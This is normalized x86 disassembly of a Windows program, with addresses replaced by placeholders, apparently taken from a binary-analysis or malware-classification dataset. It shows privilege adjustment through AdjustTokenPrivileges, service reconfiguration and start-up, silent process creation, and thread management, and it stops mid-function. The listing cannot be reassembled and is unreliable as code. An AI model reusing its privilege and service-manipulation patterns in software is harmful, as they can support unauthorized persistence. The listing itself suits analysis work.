lea eax [ esi + 0xc ]
push rw-data
push eax
call sub_412d60
add esp 0xc
mov [ esi + 0x8 ] edi
call sub_4046cc
push rw-data
call sub_405cd1
test al al
je r-xdata
mov [ ecx ] 0x0
inc ecx
dec eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov [ ebp - 0x8 ] edi
cmp [ ebp + 0x8 ] edi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x1 ] 0x1
call sub_4046cc
push rw-data
call sub_405cf1
mov eax [ rw-data ]
lea esi [ eax + 0x8 ]
mov ecx [ esi ]
mov [ ebp - 0xc ] eax
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax + ecx * 4 ]
mov esi [ rw-data ]
mov eax [ esi + 0x8 ]
mov ecx [ ebx + 0x24 ]
lea eax [ eax + ecx + 0x6b ]
mov edi esi
mov [ ebp - 0xc ] eax
call sub_4046cc
mov eax [ eax ]
imul eax eax 0x3
cdq
sub eax edx
sar eax 0x1
cmp [ ebp - 0xc ] eax
jg r-xdata
mov edi [ esi ]
lea ebx [ eax + 0x4 ]
add edi 0x18
call sub_4046cc
test ebx ebx
je r-xdata
add ecx 0xfffffff0
mov [ esi ] ecx
mov ecx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax + ecx * 4 ]
or [ eax + 0x34 ] 0x1
inc ecx
mov [ ebp - 0x8 ] ecx
cmp ecx [ ebp + 0x8 ]
jle r-xdata
mov eax [ edi + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x8 ]
lea eax [ edi + eax + 0x1c ]
mov edi [ ebx + 0x24 ]
add edi 0x3a
push edi
push ebx
push eax
mov [ ebp - 0xc ] eax
call sub_412d60
mov eax [ ebp - 0xc ]
add [ esi + 0x8 ] edi
add esp 0xc
push 0x10
add eax edi
push rw-data
push eax
call sub_412d60
add esp 0xc
add [ esi + 0x8 ] 0x10
xor eax eax
push edi
push ebx
call sub_401806
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
mov [ ebp - 0x10 ] eax
push 0x4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
lea eax [ eax + ecx + 0x1c ]
push eax
call sub_412d60
add esp 0xc
sub_40215a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
xor ebx ebx
push edi
mov esi eax
mov [ esp + 0xf ] bl
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
call sub_4046cc
mov [ esp + 0x14 ] eax
mov eax [ esi ]
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x10 ]
push eax
push ebx
lea eax [ esp + 0x1c ]
push eax
push sub_401f98
push 0x10000
push ebx
mov [ esp + 0x3c ] bl
call [ CreateThread@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp [ esp + 0x24 ] bl
jne r-xdata
call sub_4046cc
mov ecx [ esi ]
imul ecx ecx 0x18
push [ eax + ecx + 0x10 ]
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
call sub_403925
mov esi eax
call sub_4046cc
mov [ eax + 0x580c ] esi
call sub_4046cc
mov [ eax + 0x5950 ] ebx
call sub_4061d9
mov [ esp + 0xf ] 0x1
call sub_4046cc
push eax
push 0x78
pop eax
call sub_403b4d
inc [ esi ]
call sub_4046cc
mov ecx eax
mov eax [ esi ]
xor edx edx
div [ ecx + 0x304 ]
mov [ esi ] edx
mov edi edx
call sub_4046cc
mov edx [ ebp + 0x8 ]
mov ecx edi
imul ecx ecx 0x18
cmp edx [ eax + ecx + 0x14 ]
ja r-xdata
call sub_4046cc
mov ecx [ esi ]
inc ecx
imul ecx ecx 0x18
inc [ eax + ecx ]
push ebx
push edi
call [ TerminateThread@IAT ]
cmp eax 0x102
jne r-xdata
mov al [ esp + 0xf ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp edi [ eax ]
jne r-xdata
push edi
call [ CloseHandle@IAT ]
push 0x14
pop ecx
lea eax [ esp + 0x14 ]
jmp r-xdata
sub_402283
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
call sub_40264d
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
call sub_4046cc
push eax
push 0x5
pop eax
call sub_403b4d
cmp [ rw-data ] 0x0
je r-xdata
call sub_401e56
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x1c
pop esi
call sub_401e25
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x18
mov edi [ ecx + ebx + 0x14 ]
xor edx edx
mov [ ebp + 0x8 ] eax
test eax eax
jle r-xdata
push 0x1
call [ ExitThread@IAT ]
add esi 0x4
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax + edx * 4 ]
mov ecx [ eax + 0x24 ]
lea eax [ ecx + esi + 0x4e ]
cmp eax edi
ja r-xdata
and [ ebp + 0x8 ] 0x0
dec edx
mov [ ebp + 0x8 ] edx
jmp r-xdata
inc edx
lea esi [ ecx + esi + 0x4a ]
cmp edx [ ebp + 0x8 ]
jl r-xdata
push [ ebp + 0x8 ]
call sub_401ff6
pop ecx
test al al
je r-xdata
shr edi 0x1
cmp esi edi
jae r-xdata
call sub_403925
mov [ ebp - 0x8 ] eax
call sub_4046cc
mov ecx [ ebp - 0x8 ]
sub ecx [ eax + 0x580c ]
cmp ecx 0x78
jae r-xdata
call sub_4061d9
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
add esi 0x20
push esi
push eax
call sub_401923
lea eax [ ebp - 0xc ]
push eax
push esi
lea eax [ ebp - 0x4 ]
call sub_40215a
pop ecx
pop ecx
test al al
jne r-xdata
call sub_401e25
cmp eax 0x96
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebx + 0x580c ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc [ ebx + 0x5950 ]
call sub_401e25
mov edi eax
call sub_4046cc
mov esi rw-data
push esi
call sub_405cd1
test al al
je r-xdata
xor ecx ecx
test edi edi
jle r-xdata
call sub_4046cc
push esi
call sub_405cf1
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + ecx * 4 ]
and [ eax + 0x34 ] 0xfe
inc ecx
cmp ecx edi
jl r-xdata
sub_4023e2
push ebx
push esi
push edi
or edi 0xffffffff
xor ebx ebx
call sub_4046cc
cmp [ eax + 0x304 ] ebx
jle r-xdata
mov [ rw-data ] edi
pop edi
pop esi
mov eax rw-data
pop ebx
retn
xor esi esi
inc ebx
add esi 0x18
call sub_4046cc
cmp ebx [ eax + 0x304 ]
jl r-xdata
call sub_4046cc
mov edi [ eax + esi + 0x14 ]
call sub_4046cc
cmp edi [ eax + esi + 0x14 ]
jb r-xdata
sub_40242d
mov eax sub_41da33
call sub_4198ec
push ecx
push ecx
push ebx
xor ebx ebx
test [ rw-data ] 0x1
push edi
jne r-xdata
cmp [ esi + 0x304 ] ebx
je r-xdata
or [ rw-data ] 0x1
mov [ ebp - 0x4 ] ebx
call sub_4023e2
or [ ebp - 0x4 ] 0xffffffff
xor al al
cmp [ ebp + 0x8 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
jle r-xdata
push [ ebp + 0x18 ]
call sub_4064f1
cmp eax 0x4b
jg r-xdata
cmp [ esi + 0x580c ] ebx
jne r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x1c ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40647f
test al al
je r-xdata
call sub_403925
mov [ esi + 0x580c ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x5808 ]
mov [ ebp - 0x10 ] ebx
call [ GetExitCodeThread@IAT ]
mov eax [ esi + 0x5808 ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push esi
push sub_402283
push 0x10000
push ebx
call [ CreateThread@IAT ]
mov [ esi + 0x5808 ] eax
cmp [ ebp - 0x10 ] 0x103
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x1c
mov al 0x1
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40251f
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x18 ] 0x1
push 0x0
mov [ ebp - 0xc ] 0x2
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov al 0x1
push 0x0
push 0x0
push 0x10
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push [ ebp - 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
leave
retn 0x4
call [ GetLastError@IAT ]
sub_402593
push edi
mov edi [ ebx + 0x884 ]
cmp edi [ ebx + 0x880 ]
jge r-xdata
pop edi
retn
push esi
mov esi edi
imul esi esi 0x44
add esi ebx
push [ esi ]
call [ FreeLibrary@IAT ]
inc edi
add esi 0x44
cmp edi [ ebx + 0x880 ]
jl r-xdata
pop esi
sub_4025c1
mov eax ecx
xor edx edx
push esi
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov esi 0x100
lea ecx [ eax + 0xc ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
mov [ eax + 0x10c ] edx
mov [ eax + 0x110 ] edx
mov [ eax + 0x114 ] dl
pop esi
retn
sub_4025f0
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0x4
pop eax
call sub_4060be
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x4
mov [ ebp - 0x8 ] ebx
pop eax
xor al al
mov eax [ ebp - 0x4 ]
cmp eax ebx
jbe r-xdata
pop ebx
leave
retn 0x8
mov al 0x1
jmp r-xdata
push ebx
push [ ebp + 0xc ]
add eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_4060be
jmp r-xdata
sub_402659
mov eax sub_41d80a
call sub_4198ec
sub esp 0x38
cmp [ ebp + 0x8 ] 0xc0000005
push esi
je r-xdata
mov eax [ ebp + 0xc ]
mov esi [ eax ]
lea eax [ ebp - 0x44 ]
push eax
mov ecx esi
call sub_402816
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] al
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x44 ] r--data
cmp [ esi + 0x14 ] 0x1
sete al
mov [ ebp - 0x2c ] al
mov eax [ esi + 0x18 ]
mov [ ebp - 0x28 ] eax
or [ ebp - 0x4 ] 0xffffffff
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
call sub_402816
push r--data
lea eax [ ebp - 0x24 ]
push eax
call sub_4153e0
sub_402712
mov eax sub_41d7f8
call sub_4198ec
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_402759
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov al [ edi + 0x18 ]
mov [ esi + 0x18 ] al
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_402759
mov eax sub_41d7cc
call sub_4198ec
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_413835
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4027a6
mov eax sub_41d7e6
call sub_4198ec
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
or [ ebp - 0x4 ] 0xffffffff
call sub_413803
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push esi
call sub_41314a
pop ecx
sub_4027de
mov eax sub_41d7cc
call sub_4198ec
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
or [ ebp - 0x4 ] 0xffffffff
call sub_413803
test [ ebp + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push esi
call sub_41314a
pop ecx
sub_402816
mov eax sub_41d7ba
call sub_4198ec
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ecx esi
call sub_41372b
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ edi ]
mov [ esi + 0x14 ] eax
mov edi [ edi ]
cmp edi 0xc0000005
je r-xdata
mov [ esi + 0xc ] r--data
cmp edi 0xc000008e
je r-xdata
mov [ esi + 0xc ] r--data
jmp r-xdata
cmp edi 0xc0000094
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40288f
mov eax sub_41d889
call sub_4198ec
push ecx
push ebx
push ebp
push esi
push edi
push 0x1f
mov [ esp + 0x14 ] rw-data
mov edi rw-data
pop ebx
mov esi 0x118
mov ecx edi
call sub_4025c1
add edi esi
dec ebx
jns r-xdata
push 0x1f
mov edi rw-data
pop ebx
mov ecx edi
call sub_4025c1
add edi esi
dec ebx
jns r-xdata
xor ebx ebx
mov esi rw-data
mov [ rw-data ] ebx
mov ecx 0x880
mov eax esi
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov eax r--data
push eax
push eax
call [ GetModuleHandleW@IAT ]
mov edi eax
call sub_40105e
mov ebp r--data
push ebp
push ebp
call [ GetModuleHandleW@IAT ]
mov edi eax
call sub_40105e
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ esp + 0x1c ] ebx
call [ FreeConsole@IAT ]
push 0x8007
call [ SetErrorMode@IAT ]
push sub_40288a
call [ SetUnhandledExceptionFilter@IAT ]
call sub_40264d
or esi 0xffffffff
push esi
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
push 0x64
mov [ rw-data ] bl
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop ecx
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] 0x1
mov [ rw-data ] esi
mov [ rw-data ] bl
call sub_403925
mov [ rw-data ] eax
call sub_403925
sub eax 0xd98
push 0x8
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop ecx
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov ecx 0x120
mov eax rw-data
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push rw-data
call sub_405caf
push rw-data
call sub_405caf
push rw-data
mov [ rw-data ] esi
call sub_405caf
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ebx ebp
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ebx ebp
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
mov [ esp + 0x1c ] esi
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov eax rw-data
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_402aaf
push ebp
mov ebp esp
sub esp 0x858
push ebx
push esi
push 0x44
pop ecx
mov edx ecx
lea eax [ ebp - 0x58 ]
xor ebx ebx
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
push 0x10
pop edx
lea eax [ ebp - 0x10 ]
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
push [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea eax [ ebp - 0x858 ]
push eax
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x2c ] 0x81
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x858 ]
push eax
call esi
push [ ebp + 0xc ]
lea eax [ ebp - 0x858 ]
push eax
call esi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push 0x8000000
push ebx
push ebx
push ebx
lea eax [ ebp - 0x858 ]
push eax
push ebx
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
xor al al
cmp edi ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
pop esi
pop ebx
leave
retn 0x8
sub_402b4f
push ebx
push ebp
push 0xf003f
xor ebx ebx
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
mov ebp eax
cmp ebp ebx
jne r-xdata
push esi
push edi
push 0xf01ff
push [ esp + 0x18 ]
push ebp
call [ OpenServiceW@IAT ]
mov edi [ CloseServiceHandle@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
xor al al
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push 0x2
push 0xffffffff
push esi
call [ ChangeServiceConfigW@IAT ]
push ebx
push ebx
push esi
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
push ebp
call edi
pop edi
mov al bl
pop esi
jmp r-xdata
mov bl 0x1
call [ GetLastError@IAT ]
cmp eax 0x420
jne r-xdata
pop ebp
pop ebx
retn 0x4
push esi
call edi
jmp r-xdata
sub_402be5
mov eax sub_41d9a8
call sub_4198ec
sub esp 0x78
push ebx
push esi
push edi
lea eax [ ebp - 0x84 ]
push eax
mov edi ecx
call sub_401108
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x4c ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
push 0x1
push 0x200000
lea esi [ ebp - 0x3c ]
mov [ ebp - 0x11 ] 0x0
call sub_405d65
mov [ ebp - 0x4 ] 0x2
cmp [ edi + 0x588 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x3c ]
call sub_405f2c
jmp r-xdata
lea eax [ edi + 0x57a4 ]
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov bl [ ebp - 0x11 ]
jmp r-xdata
xor al al
push eax
call sub_405cd1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x4c ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x84 ]
push eax
call sub_40114f
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
call sub_403925
sub eax [ edi + 0x5810 ]
mov [ ebp - 0x24 ] eax
cmp eax 0xe10
jb r-xdata
test al al
je r-xdata
xor esi esi
xor ebx ebx
mov edx 0x118
cmp [ edi + 0x2bfc ] esi
jle r-xdata
call sub_403925
mov ebx [ edi + 0x58c ]
mov [ edi + 0x5810 ] eax
xor ebx ebx
cmp [ edi + 0x4f00 ] esi
jle r-xdata
lea eax [ edi + 0xa08 ]
mov [ ecx ] 0x0
inc ecx
dec edx
jne r-xdata
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x24 ]
push eax
push edx
lea eax [ ebp - 0x60 ]
push eax
push sub_401dc3
push 0x10000
push edx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x50 ] dl
call [ CreateThread@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ edi + 0x581c ] 0x0
je r-xdata
lea eax [ edi + 0x2d0c ]
inc ebx
add eax edx
cmp ebx [ edi + 0x2bfc ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
cmp [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x1c ] eax
je r-xdata
mov esi ebx
imul esi esi 0x14
push [ esi + edi + 0x314 ]
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
cmp [ ebp - 0x18 ] esi
je r-xdata
mov ecx [ edi + 0x5814 ]
cmp ecx esi
je r-xdata
inc ebx
add eax edx
cmp ebx [ edi + 0x4f00 ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
cmp [ eax - 0x108 ] 0xff00bb00
jne r-xdata
cmp ecx 0x10
jl r-xdata
lea eax [ ebx + 0x1 ]
xor edx edx
div [ edi + 0x588 ]
mov ebx edx
mov [ edi + 0x58c ] ebx
test eax eax
jle r-xdata
inc [ esi + edi + 0x318 ]
push 0x0
push [ ebp - 0x20 ]
call [ TerminateThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x18 ]
call sub_405cf1
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ecx
mov ecx [ edi + 0x5818 ]
mov [ ebp - 0x20 ] ecx
mov [ edi + 0x5814 ] esi
mov [ edi + 0x5818 ] esi
jmp r-xdata
cmp [ eax - 0x108 ] 0xff00bb00
jne r-xdata
cmp ecx 0x10
jl r-xdata
imul ebx ebx 0x118
lea esi [ ebx + edi ]
dec [ esi + 0xa08 ]
lea ecx [ esi + 0x908 ]
mov eax [ ecx ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x90c ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0xa08 ]
shl eax 0x4
push eax
lea eax [ esi + 0x918 ]
push eax
push ecx
call sub_412d60
mov ecx [ esi + 0xa08 ]
shl ecx 0x4
add ecx ebx
xor eax eax
mov [ ecx + edi + 0x908 ] eax
mov ecx [ esi + 0xa08 ]
shl ecx 0x4
add ecx ebx
mov [ ecx + edi + 0x90c ] eax
mov ecx [ esi + 0xa08 ]
add ecx 0x91
shl ecx 0x4
add ecx ebx
mov [ ecx + edi ] eax
mov [ esi + 0x914 ] 0x1
mov eax [ ebp - 0x38 ]
push 0x14
mov [ ebp - 0x1c ] eax
pop edx
lea ecx [ ebp - 0x60 ]
inc [ edi + 0x5954 ]
jmp r-xdata
cmp ebx [ edi + 0x58c ]
jne r-xdata
call sub_403925
cmp [ ebp - 0x3c ] 0x0
mov [ edi + 0x5810 ] eax
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
je r-xdata
imul ebx ebx 0x118
lea esi [ ebx + edi ]
dec [ esi + 0x2d0c ]
lea ecx [ esi + 0x2c0c ]
mov eax [ ecx ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x2c10 ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x2d0c ]
shl eax 0x4
push eax
lea eax [ esi + 0x2c1c ]
push eax
push ecx
call sub_412d60
mov ecx [ esi + 0x2d0c ]
shl ecx 0x4
add ecx ebx
xor eax eax
mov [ ecx + edi + 0x2c0c ] eax
mov ecx [ esi + 0x2d0c ]
add ecx 0x2c1
shl ecx 0x4
add ecx ebx
mov [ ecx + edi ] eax
mov ecx [ esi + 0x2d0c ]
shl ecx 0x4
add ecx ebx
mov [ ecx + edi + 0x2c14 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x3c ]
call sub_405f2c
xor ebx ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x18 ]
call sub_405cf1
mov ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x1c ]
mov esi edi
call sub_401a84
and [ edi + 0x5954 ] 0x0
cmp [ ebp - 0x1c ] 0x1
jle r-xdata
add esp 0xc
cmp [ ebp - 0x18 ] eax
xor bl bl
mov edi [ ebp - 0x20 ]
cmp edi ebx
jbe r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x3c ]
call sub_401923
jle r-xdata
push ebx
push [ ebp - 0x1c ]
mov eax edi
lea ecx [ ebp - 0x4c ]
call sub_4060be
lea eax [ ebp - 0x4c ]
lea ebx [ ebp - 0x84 ]
call sub_4013ef
lea eax [ ebp - 0x28 ]
push eax
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebp - 0x28 ] 0x5b61360
call sub_4015ac
push r--data
push [ ebp - 0x2c ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
lea esi [ ebp - 0x4c ]
call sub_405f9d
mov [ ebp - 0x11 ] 0x1
sub_402ff5
mov eax sub_41d981
call sub_4198ec
sub esp 0x290
push ebx
push esi
push edi
lea eax [ ebp - 0x90 ]
push eax
mov edi ecx
call sub_401108
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x6c ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x5c ]
call sub_405d11
mov [ ebp - 0x4 ] 0x2
push 0x1
push 0x200000
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x11 ] 0x0
call sub_405d65
mov [ ebp - 0x4 ] 0x3
cmp [ edi + 0x588 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0x30 ]
call sub_405f2c
jmp r-xdata
lea eax [ edi + 0x57a4 ]
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov bl [ ebp - 0x11 ]
jmp r-xdata
xor al al
push eax
call sub_405cd1
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x5c ]
call sub_405f2c
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x6c ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x90 ]
push eax
call sub_40114f
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
call sub_403925
sub eax [ edi + 0x5810 ]
mov [ ebp - 0x38 ] eax
cmp eax 0xe10
jb r-xdata
test al al
je r-xdata
xor esi esi
xor ebx ebx
mov edx 0x118
cmp [ edi + 0x2bfc ] esi
jle r-xdata
call sub_403925
mov ebx [ edi + 0x58c ]
mov [ edi + 0x5810 ] eax
xor ebx ebx
cmp [ edi + 0x4f00 ] esi
jle r-xdata
lea eax [ edi + 0xa08 ]
mov [ ecx ] 0x0
inc ecx
dec edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x38 ]
push eax
push edx
lea eax [ ebp - 0x4c ]
push eax
push sub_401dc3
push 0x10000
push edx
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] dl
call [ CreateThread@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax 0xffffffff
je r-xdata
cmp [ edi + 0x581c ] 0x0
jne r-xdata
lea eax [ edi + 0x2d0c ]
inc ebx
add eax edx
cmp ebx [ edi + 0x2bfc ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
cmp [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x18 ] eax
je r-xdata
mov esi ebx
imul esi esi 0x14
push [ esi + edi + 0x314 ]
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
mov eax [ edi + 0x5814 ]
cmp eax esi
je r-xdata
inc ebx
add eax edx
cmp ebx [ edi + 0x4f00 ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
cmp [ eax - 0x108 ] 0xff00aaee
jne r-xdata
cmp ecx 0x10
jl r-xdata
lea eax [ ebx + 0x1 ]
xor edx edx
div [ edi + 0x588 ]
mov ebx edx
mov [ edi + 0x58c ] ebx
test eax eax
jle r-xdata
inc [ esi + edi + 0x318 ]
push 0x0
push [ ebp - 0x20 ]
call [ TerminateThread@IAT ]
cmp eax 0xffffffff
